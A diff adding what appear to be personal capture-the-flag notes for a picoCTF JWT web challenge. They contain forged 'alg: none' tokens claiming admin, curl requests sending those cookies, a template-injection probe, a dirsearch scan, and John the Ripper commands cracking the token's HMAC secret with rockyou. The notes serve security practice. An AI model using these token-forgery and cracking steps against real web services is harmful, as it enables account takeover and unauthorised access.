@@ -1,0 +1,41 @@
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+
+curl -H 'Cookie:jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiMTIzIn0.jgZBxsEy_Mq68jv7XDm-sQr1BUOMHuV8c4dUIxHMT2k' https://2019shell1.picoctf.com/problem/45158/
+
+
+curl  'https://2019shell1.picoctf.com/problem/45158/{{()}}'
+
+
+curl -d "name=1" https://2019shell1.picoctf.com/problem/45158/
+
+curl -H 'Cookie:jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.' https://2019shell1.picoctf.com/problem/45158//
+
+
+dirsearch.py -u https://2019shell1.picoctf.com/problem/45158/ -e *
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiMTIzIn0.jgZBxsEy_Mq68jv7XDm-sQr1BUOMHuV8c4dUIxHMT2k
+
+eyJhbGciOiJOb25lIiwidHlwIjoiSldTIn0=.eyJ1c2VyIjoiYWRtaW4ifQ.
+
+
+D:\download\jwtcrack-master\jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiMTIzIn0.jgZBxsEy_Mq68jv7XDm-sQr1BUOMHuV8c4dUIxHMT2k
+D:\EXEs\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=rockyou.txt  --format=HMAC-SHA256 jwt.txt
+
+------------------------------------------------------------------------------------------------------------------------------
+D:\CODE\myCode\python\ctf\jwt\jwt2john\jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.A6fgbPRG8nrPbsdiLANVd8E4b8h0HXpz6Pv7rw7J-ug
+
+#test
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ#48fd11d944840c7a8f57b99c20ad3c640b385ad3cc43435d307b920fcb6758ec
+
+#real
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiMSJ9#29b76dac30d061975c82071b4cb8e9bde5ec7e65d3c5fccf6cb32bb3c25db739
+
+
+
+
+
+
+
+
+
